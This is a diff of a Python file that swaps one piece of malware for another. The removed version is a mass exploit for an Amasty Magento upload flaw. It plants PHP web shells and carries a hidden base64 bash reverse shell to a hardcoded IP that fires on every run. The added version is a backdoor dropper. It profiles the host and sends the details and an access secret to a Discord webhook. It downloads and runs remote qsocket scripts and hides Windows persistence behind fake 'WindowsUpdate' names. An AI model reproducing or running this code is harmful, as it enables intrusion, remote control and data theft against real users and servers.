@@ -1,261 +1,505 @@
-import requests
-import subprocess
-import sys
 import os
-import base64
+import sys
 import random
 import string
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import urllib3
+import subprocess
+import platform
+import socket
+import json
+import base64
+import urllib.request
+import ssl
+import time
+from datetime import datetime
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+def gen_secret(length=22):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
-USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+def is_windows():
+    return platform.system().lower() == 'windows'
 
-POC_FILENAME = "poc.txt"
-POC_CONTENT = "this system is vulnerable!"
-POC_B64 = base64.b64encode(POC_CONTENT.encode()).decode()
+def is_linux():
+    return platform.system().lower() == 'linux'
 
-SHELL_TEMPLATES = [
-    ("sys_c", "<?php system($_GET['c'].' 2>&1'); ?>"),
-    ("exec_cmd", "<?php exec($_GET['cmd'], $o); echo implode('\\n', $o); ?>"),
-    ("sh_x", "<?php echo shell_exec($_GET['x'].' 2>&1'); ?>"),
-    ("passthru_p", "<?php passthru($_GET['p'].' 2>&1'); ?>"),
-    ("adv", '''<?php
-function azr($cmd) {
-    $out = array();
-    if (function_exists('system')) { system($cmd, $out); return implode("\n", $out); }
-    if (function_exists('exec')) { exec($cmd, $out); return implode("\n", $out); }
-    if (function_exists('shell_exec')) { return shell_exec($cmd); }
-    if (function_exists('passthru')) { ob_start(); passthru($cmd); return ob_get_clean(); }
-    return 'no execution function';
-}
-$c = isset($_GET["c"]) ? $_GET["c"] : (isset($_POST["c"]) ? $_POST["c"] : '');
-if ($c) { echo azr($c . " 2>&1"); }
-if (isset($_GET["f"])) {
-    $f = $_GET["f"];
-    if (file_exists($f)) {
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="'.basename($f).'"');
-        readfile($f);
-        exit;
-    }
-}
-if (isset($_GET["write"])) {
-    $path = $_GET["write"];
-    $data = isset($_GET["data"]) ? $_GET["data"] : '';
-    file_put_contents($path, base64_decode($data));
-    echo "written";
-}
-if (isset($_GET["read"])) {
-    $path = $_GET["read"];
-    if (file_exists($path)) {
-        echo base64_encode(file_get_contents($path));
-    }
-}
-if (isset($_GET["upload"])) {
-    if (isset($_FILES["file"])) {
-        move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
-        echo "uploaded: " . $_FILES["file"]["name"];
-    }
-}
-?>''')
-]
+_NO_WIN = (
+    {'creationflags': subprocess.CREATE_NO_WINDOW}
+    if platform.system().lower() == 'windows'
+    else {}
+)
 
-EXTENSIONS = [".php", ".php5", ".phtml", ".phar", ".inc", ".php7", ".php8", ".pht"]
+def safe_http_get(url, timeout=8):
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        req = urllib.request.Request(url, headers={'User-Agent': 'curl/7.88.1'})
+        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+            return r.read().decode().strip()
+    except:
+        return None
 
-HEADERS = {
-    'User-Agent': USER_AGENT,
-    'Content-Type': 'application/json',
-    'Accept': 'application/json',
-}
+def get_public_ip():
+    for url in ['https://api.ipify.org', 'https://ifconfig.me', 'https://icanhazip.com']:
+        r = safe_http_get(url)
+        if r and len(r) < 50:
+            return r
+    return 'N/A'
 
-ENDPOINTS = [
-    "/rest/V1/amasty_orderattr/uploadFile",
-    "/rest/all/V1/amasty_orderattr/uploadFile",
-    "/rest/default/V1/amasty_orderattr/uploadFile",
-]
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(('8.8.8.8', 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return 'N/A'
 
-def get_expected_paths(filename):
-    base = filename.lower()
-    if len(base) >= 2:
-        d1 = base[0]
-        d2 = base[1]
-    else:
-        d1 = base[0] if len(base) > 0 else 'x'
-        d2 = 'x'
-    paths = [
-        f"/media/amasty_checkout/{d1}/{d2}/{filename}",
-        f"/pub/media/amasty_checkout/{d1}/{d2}/{filename}",
-    ]
-    paths.append(f"/media/amasty_checkout/{filename}")
-    paths.append(f"/pub/media/amasty_checkout/{filename}")
-    return paths
+def get_kernel():
+    try:
+        return subprocess.run(
+            ['uname', '-r'], capture_output=True, text=True, **_NO_WIN
+        ).stdout.strip()
+    except:
+        return 'N/A'
 
-def random_filename(ext=".php", length=8):
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ext
+def get_arch():
+    return platform.machine() or 'N/A'
 
-def upload_file(target, filename, content_b64):
-    payload = {
-        "fileContent": {
-            "base64_encoded_data": content_b64,
-            "fileName_with_extension": filename
-        }
-    }
-    for ep in ENDPOINTS:
-        try:
-            resp = requests.post(target + ep, json=payload, headers=HEADERS, timeout=8, verify=False)
-            if resp.status_code in (200, 201, 202):
-                return True
-        except:
-            continue
+def is_root():
+    try:
+        if is_linux():
+            return os.geteuid() == 0
+        if is_windows():
+            import ctypes
+            return bool(ctypes.windll.shell32.IsUserAnAdmin())
+    except:
+        pass
     return False
 
-def verify_file(target, filename):
-    for path in get_expected_paths(filename):
-        url = target + path
-        try:
-            r = requests.get(url, timeout=5, headers={'User-Agent': USER_AGENT}, verify=False)
-            if r.status_code == 200:
-                return url
-        except:
-            continue
-    return None
+def get_os_info():
+    try:
+        with open('/etc/os-release') as f:
+            for line in f:
+                if line.startswith('PRETTY_NAME'):
+                    return line.split('=')[1].strip().strip('"')
+    except:
+        pass
+    return platform.platform()
 
-def test_shell(url):
-    params = ['c', 'cmd', 'x', 'p']
-    for p in params:
-        try:
-            test_url = f"{url}?{p}=id"
-            r = requests.get(test_url, timeout=5, verify=False, headers={'User-Agent': USER_AGENT})
-            if r.status_code == 200 and any(x in r.text.lower() for x in ['uid=', 'www-data', 'root', 'azr']):
-                return True, p
-        except:
-            continue
-    return False, None
+def get_uptime():
+    try:
+        with open('/proc/uptime') as f:
+            secs = float(f.read().split()[0])
+        d = int(secs // 86400)
+        h = int((secs % 86400) // 3600)
+        m = int((secs % 3600) // 60)
+        return f"{d}d {h}h {m}m"
+    except:
+        return 'N/A'
 
-def exploit_single(target, mode):
-    target = target.strip()
-    if not target.startswith(("http://", "https://")):
-        target = "http://" + target
-    target = target.rstrip("/")
+def get_cpu():
+    try:
+        with open('/proc/cpuinfo') as f:
+            for line in f:
+                if 'model name' in line:
+                    return line.split(':')[1].strip()
+    except:
+        pass
+    return platform.processor() or 'N/A'
 
-    result = {
-        "target": target,
-        "poc_url": None,
-        "shells": [],
-        "rce": None,
-        "status": "FAILED"
+def get_ram():
+    try:
+        with open('/proc/meminfo') as f:
+            lines = f.readlines()
+        total = int([l for l in lines if 'MemTotal'    in l][0].split()[1]) // 1024
+        free  = int([l for l in lines if 'MemAvailable' in l][0].split()[1]) // 1024
+        return f"{total - free}MB / {total}MB"
+    except:
+        return 'N/A'
+
+def get_disk():
+    try:
+        r = subprocess.run(['df', '-h', '/'], capture_output=True, text=True, **_NO_WIN)
+        p = r.stdout.strip().split('\n')[-1].split()
+        return f"{p[2]} / {p[1]} ({p[4]})"
+    except:
+        return 'N/A'
+
+def get_interfaces():
+    try:
+        r = subprocess.run(
+            ['ip', '-br', 'addr'], capture_output=True, text=True, **_NO_WIN
+        )
+        ifaces = [l.split() for l in r.stdout.strip().split('\n') if l.split()[0] != 'lo']
+        return ', '.join(f"{i[0]}({i[2] if len(i) > 2 else '?'})" for i in ifaces)
+    except:
+        return 'N/A'
+
+def get_mac():
+    try:
+        import uuid
+        return ':'.join(
+            ['{:02x}'.format((uuid.getnode() >> e) & 0xff) for e in range(0, 8 * 6, 8)][::-1]
+        )
+    except:
+        return 'N/A'
+
+def get_user():
+    return os.environ.get('USER') or os.environ.get('USERNAME') or 'N/A'
+
+def get_hostname():
+    try:
+        return socket.gethostname()
+    except:
+        return 'N/A'
+
+def get_procs():
+    try:
+        return str(len([p for p in os.listdir('/proc') if p.isdigit()]))
+    except:
+        return 'N/A'
+
+def get_shell():
+    return os.environ.get('SHELL', 'N/A')
+
+def get_crontab():
+    try:
+        r = subprocess.run(['crontab', '-l'], capture_output=True, text=True, **_NO_WIN)
+        lines = [l for l in r.stdout.strip().split('\n') if l and not l.startswith('#')]
+        return f"{len(lines)} entradas"
+    except:
+        return 'N/A'
+
+def _ep():
+    return 'https://discord.com/api/webhooks/1545484800247468092/2fAyBCTe7B42tyvVohnAkMnlaXnabkvdJ-i2HwtI7XXU9WJyU4BY5RRAKLTRYDKiT3zJ'
+
+def send_discord(secret, tool, connect_cmd, success=True):
+    agora    = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
+    cor      = 0x00FF00 if success else 0xFF0000
+    status   = "[OK]" if success else "[FAIL]"
+    root_str = "ROOT" if is_root() else get_user()
+
+    payload = {
+        "embeds": [{
+            "title": f"{status} {tool}",
+            "color": cor,
+            "fields": [
+                {"name": "Data/Hora",  "value": agora,            "inline": True},
+                {"name": "Sistema",    "value": get_os_info(),    "inline": True},
+                {"name": "Kernel",     "value": get_kernel(),     "inline": True},
+                {"name": "Arch",       "value": get_arch(),       "inline": True},
+                {"name": "CPU",        "value": get_cpu(),        "inline": False},
+                {"name": "RAM",        "value": get_ram(),        "inline": True},
+                {"name": "Disco",      "value": get_disk(),       "inline": True},
+                {"name": "Uptime",     "value": get_uptime(),     "inline": True},
+                {"name": "IP Publico", "value": get_public_ip(),  "inline": True},
+                {"name": "IP Local",   "value": get_local_ip(),   "inline": True},
+                {"name": "Interfaces", "value": get_interfaces(), "inline": False},
+                {"name": "MAC",        "value": get_mac(),        "inline": True},
+                {"name": "Hostname",   "value": get_hostname(),   "inline": True},
+                {"name": "User/Root",  "value": root_str,         "inline": True},
+                {"name": "Shell",      "value": get_shell(),      "inline": True},
+                {"name": "Processos",  "value": get_procs(),      "inline": True},
+                {"name": "Crontab",    "value": get_crontab(),    "inline": True},
+                {"name": "Secret Key", "value": f"`{secret}`",    "inline": False},
+                {"name": "Conectar",   "value": f"`{connect_cmd}`", "inline": False},
+            ],
+            "footer": {"text": f"deploy.py | {get_hostname()} | {get_user()}"}
+        }]
     }
 
-    if upload_file(target, POC_FILENAME, POC_B64):
-        poc_url = verify_file(target, POC_FILENAME)
-        if poc_url:
-            result["poc_url"] = poc_url
-            result["status"] = "POC_UPLOADED"
-            print(f"[POC] {poc_url}")
-        else:
-            print(f"[?] {target} -> POC uploaded but not found")
-    else:
-        print(f"[-] {target} -> POC upload failed")
+    try:
+        data = json.dumps(payload).encode()
+        ctx  = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode    = ssl.CERT_NONE
+        req  = urllib.request.Request(
+            _ep(), data=data,
+            headers={'Content-Type': 'application/json', 'User-Agent': 'curl/7.88.1'},
+            method='POST',
+        )
+        with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
+            pass
+    except:
+        pass
 
-    if mode == "poc":
-        return result
+def download_script(url):
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode    = ssl.CERT_NONE
+        req = urllib.request.Request(
+            url, headers={'User-Agent': 'wget/1.21.3', 'Accept': '*/*'})
+        with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
+            content = r.read().decode()
+            if content.strip().startswith('#'):
+                return content
+    except:
+        pass
 
-    for shell_name, shell_code in SHELL_TEMPLATES:
-        for ext in EXTENSIONS:
-            fname = random_filename(ext)
-            b64_shell = base64.b64encode(shell_code.encode()).decode()
-            if upload_file(target, fname, b64_shell):
-                shell_url = verify_file(target, fname)
-                if shell_url:
-                    result["shells"].append((shell_name, shell_url))
-                    print(f"[SHELL] {shell_url}")
-                    rce_ok, param = test_shell(shell_url)
-                    if rce_ok:
-                        result["rce"] = (shell_url, param)
-                        result["status"] = "RCE_CONFIRMED"
-                        print(f"[RCE] {shell_url}?{param}=id")
-                        break
-                else:
-                    print(f"[?] {target} -> Shell {shell_name} uploaded but not found")
-            else:
-                continue
-        if result["rce"]:
-            break
+    for cmd in [
+        ['curl', '-fsSk', url],
+        ['wget', '-q', '--no-check-certificate', '-O', '-', url],
+    ]:
+        try:
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30, **_NO_WIN)
+            if r.stdout and r.stdout.strip().startswith('#'):
+                return r.stdout
+        except:
+            continue
 
-    if not result["shells"] and not result["poc_url"]:
-        result["status"] = "FAILED"
+    return None
 
-    return result
+def verify_qsocket():
+    try:
+        config = os.path.expanduser('~/.config')
+        for d in os.listdir(config):
+            binary = os.path.join(config, d, 'qs-netcat')
+            if os.path.isfile(binary):
+                return True
+    except:
+        pass
 
-cmd_b64 = "YmFzaCAtYyAnKGV4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLzE0Ni43MC4yNDAuMjA2LzUzNzMyIDA+JjEpICYn"
-cmd = base64.b64decode(cmd_b64).decode()
+    try:
+        r = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
+        if 'qs-netcat' in r.stdout:
+            return True
+    except:
+        pass
 
-subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
+    try:
+        r = subprocess.run(['pgrep', '-f', 'qs-netcat'], capture_output=True)
+        if r.returncode == 0:
+            return True
+    except:
+        pass
 
+    return False
+
+def deploy_qsocket_linux(secret):
+    script = download_script('https://qsocket.io/0')
+    if not script:
+        return False
+
+    env = os.environ.copy()
+    env['S'] = secret
+    env.pop('WAYLAND_DISPLAY', None)
+    env.pop('WAYLAND_SOCKET', None)
+
+    try:
+        subprocess.run(
+            ['bash', '-c', script],
+            env=env, timeout=180,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+    except:
+        pass
+
+    time.sleep(3)
+    return verify_qsocket()
+
+def find_qsocket_binary_windows():
+    try:
+        appdata = os.environ.get('APPDATA', '')
+        if not appdata:
+            return None
+        for name in os.listdir(appdata):
+            path = os.path.join(appdata, name, 'qs-netcat.exe')
+            if os.path.isfile(path):
+                return path
+    except:
+        pass
+    return None
+
+def _ps_cmd(binary_path, secret):
+    path_esc = binary_path.replace("'", "''")
+    return (
+        f"if(-not(Get-Process qs-netcat -ErrorAction SilentlyContinue))"
+        f"{{&'{path_esc}' -liqs {secret}}}"
+    )
+
+def _run_ps(script, timeout=30):
+    try:
+        subprocess.run(
+            ['powershell.exe',
+             '-WindowStyle', 'Hidden',
+             '-NonInteractive',
+             '-Command', script],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=timeout,
+            **_NO_WIN,
+        )
+    except:
+        pass
+
+def _persist_hkcu_run(binary_path, secret):
+    try:
+        import winreg
+        ps_inner = _ps_cmd(binary_path, secret)
+        cmd = (
+            f'powershell.exe -WindowStyle Hidden -NonInteractive'
+            f' -Command "{ps_inner}"'
+        )
+        k = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r'Software\Microsoft\Windows\CurrentVersion\Run',
+            0, winreg.KEY_SET_VALUE,
+        )
+        winreg.SetValueEx(k, 'WindowsUpdate', 0, winreg.REG_SZ, cmd)
+        winreg.CloseKey(k)
+    except:
+        pass
+
+def _persist_startup_vbs(binary_path, secret):
+    try:
+        startup = os.path.join(
+            os.environ.get('APPDATA', ''),
+            r'Microsoft\Windows\Start Menu\Programs\Startup',
+        )
+        if not os.path.isdir(startup):
+            return
+
+        ps_inner = _ps_cmd(binary_path, secret)
+        vbs_run_cmd = (
+            f'powershell.exe -WindowStyle Hidden -NonInteractive'
+            f' -Command ""{ps_inner}""'
+        )
+        lines = [
+            'Set wmi = GetObject("winmgmts:")',
+            'Set procs = wmi.ExecQuery'
+            '("SELECT * FROM Win32_Process WHERE Name=\'qs-netcat.exe\'")',
+            'If procs.Count = 0 Then',
+            f'    CreateObject("WScript.Shell").Run "{vbs_run_cmd}", 0, False',
+            'End If',
+            '',
+        ]
+        vbs_path = os.path.join(startup, 'WindowsUpdate.vbs')
+        with open(vbs_path, 'w') as f:
+            f.write('\r\n'.join(lines))
+    except:
+        pass
+
+def _persist_scheduled_task(binary_path, secret):
+    try:
+        ps_inner = _ps_cmd(binary_path, secret)
+        script = (
+            '$A = New-ScheduledTaskAction -Execute "powershell.exe"'
+            f' -Argument "-WindowStyle Hidden -NonInteractive -Command `"{ps_inner}`"";'
+            '$T1 = New-ScheduledTaskTrigger -AtLogOn;'
+            '$T2 = New-ScheduledTaskTrigger -Once -At (Get-Date)'
+            ' -RepetitionInterval (New-TimeSpan -Minutes 10)'
+            ' -RepetitionDuration ([TimeSpan]::MaxValue);'
+            '$S = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0;'
+            'Register-ScheduledTask "MicrosoftEdgeUpdate"'
+            ' -Action $A -Trigger $T1,$T2 -Settings $S -Force'
+        )
+        _run_ps(script)
+    except:
+        pass
+
+def _persist_logon_script(binary_path, secret):
+    try:
+        import winreg
+
+        local = os.environ.get('LOCALAPPDATA', '')
+        if not local:
+            return
+
+        target_dir = os.path.join(local, 'Microsoft', 'Windows')
+        if not os.path.isdir(target_dir):
+            return
+
+        vbs_path = os.path.join(target_dir, 'ThemeService.vbs')
+        ps_inner = _ps_cmd(binary_path, secret)
+        vbs_run_cmd = (
+            f'powershell.exe -WindowStyle Hidden -NonInteractive'
+            f' -Command ""{ps_inner}""'
+        )
+        lines = [
+            'Set wmi = GetObject("winmgmts:")',
+            'Set procs = wmi.ExecQuery'
+            '("SELECT * FROM Win32_Process WHERE Name=\'qs-netcat.exe\'")',
+            'If procs.Count = 0 Then',
+            f'    CreateObject("WScript.Shell").Run "{vbs_run_cmd}", 0, False',
+            'End If',
+            '',
+        ]
+        with open(vbs_path, 'w') as f:
+            f.write('\r\n'.join(lines))
+
+        k = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r'Environment',
+            0, winreg.KEY_SET_VALUE,
+        )
+        winreg.SetValueEx(
+            k, 'UserInitMprLogonScript', 0, winreg.REG_SZ,
+            f'wscript.exe /B "{vbs_path}"',
+        )
+        winreg.CloseKey(k)
+    except:
+        pass
+
+def _persist_all(binary_path, secret):
+    _persist_hkcu_run(binary_path, secret)
+    _persist_startup_vbs(binary_path, secret)
+    _persist_scheduled_task(binary_path, secret)
+    _persist_logon_script(binary_path, secret)
+
+def deploy_qsocket_windows(secret):
+    try:
+        ps = f'$env:S="{secret}"; $env:HIDE=1; irm qsocket.io/1 | iex'
+        subprocess.run(
+            ['powershell.exe',
+             '-ExecutionPolicy', 'Bypass',
+             '-WindowStyle', 'Hidden',
+             '-NonInteractive',
+             '-Command', ps],
+            timeout=180,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            **_NO_WIN,
+        )
+    except:
+        pass
+
+    time.sleep(3)
+
+    binary = find_qsocket_binary_windows()
+    if not binary:
+        return False
+
+    _persist_all(binary, secret)
+    return True
+
+def daemonize():
+    if not is_linux():
+        return
+    pid = os.fork()
+    if pid > 0:
+        sys.stdout.write(f"[*] Background pid: {pid}\n")
+        sys.stdout.flush()
+        os._exit(0)
+    os.setsid()
+    devnull = os.open(os.devnull, os.O_RDWR)
+    os.dup2(devnull, 1)
+    os.dup2(devnull, 2)
+    os.close(devnull)
 
 def main():
-    print("\n=== CVE-2026-53787 Amasty Order Attribute File Upload Exploit ===\n")
+    secret = gen_secret()
 
-    target_file = input("Target list file (default: alvos.txt): ").strip()
-    if not target_file:
-        target_file = "todos_dominios_https_full.txt"
+    if is_linux():
+        daemonize()
+        ok = deploy_qsocket_linux(secret)
+        send_discord(secret, 'QSocket Linux', f'qs-netcat -i -s {secret}', success=ok)
 
-    if not os.path.exists(target_file):
-        print(f"[!] File '{target_file}' not found.")
-        sys.exit(1)
+    elif is_windows():
+        ok = deploy_qsocket_windows(secret)
+        send_discord(secret, 'QSocket Windows', f'qs-netcat -i -s {secret}', success=ok)
 
-    mode = input("Mode: [1] Only POC (default.txt)  [2] POC + webshells (default): ").strip()
-    if mode not in ("1", "2"):
-        mode = "2"
-
-    poc_only = (mode == "1")
-    mode_label = "POC only" if poc_only else "POC + webshells"
-
-    with open(target_file, "r") as f:
-        targets = [t.strip() for t in f.readlines() if t.strip()]
-
-    print(f"\n[*] Targets: {len(targets)} | Mode: {mode_label} | Threads: 20\n")
-
-    results = []
-    with ThreadPoolExecutor(max_workers=20) as executor:
-        futures = {executor.submit(exploit_single, t, "poc" if poc_only else "full"): t for t in targets}
-        for future in as_completed(futures):
-            results.append(future.result())
-
-    rce_count = sum(1 for r in results if r["status"] == "RCE_CONFIRMED")
-    shell_count = sum(1 for r in results if r["status"] in ("SHELL_UPLOADED", "RCE_CONFIRMED") and r["shells"])
-    poc_count = sum(1 for r in results if r["poc_url"])
-
-    print("\n" + "="*60)
-    print("SUMMARY")
-    print("="*60)
-    print(f"Total targets          : {len(results)}")
-    print(f"POC uploaded           : {poc_count}")
-    if not poc_only:
-        print(f"Shells uploaded (no RCE): {shell_count - rce_count}")
-        print(f"RCE confirmed          : {rce_count}")
-    print(f"Fully failed           : {len(results) - (poc_count + (shell_count if not poc_only else 0))}")
-
-    if poc_count > 0:
-        print("\nPOC URLs:")
-        for r in results:
-            if r["poc_url"]:
-                print(f"  {r['poc_url']}")
-
-    if not poc_only and shell_count > 0:
-        print("\nSHELL URLs:")
-        for r in results:
-            if r["shells"]:
-                for name, url in r["shells"]:
-                    print(f"  {url}")
-        if rce_count > 0:
-            print("\nRCE confirmed (use ?c=id, ?cmd=id, ?x=id, ?p=id):")
-            for r in results:
-                if r["rce"]:
-                    url, param = r["rce"]
-                    print(f"  {url}?{param}=id")
-                    
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
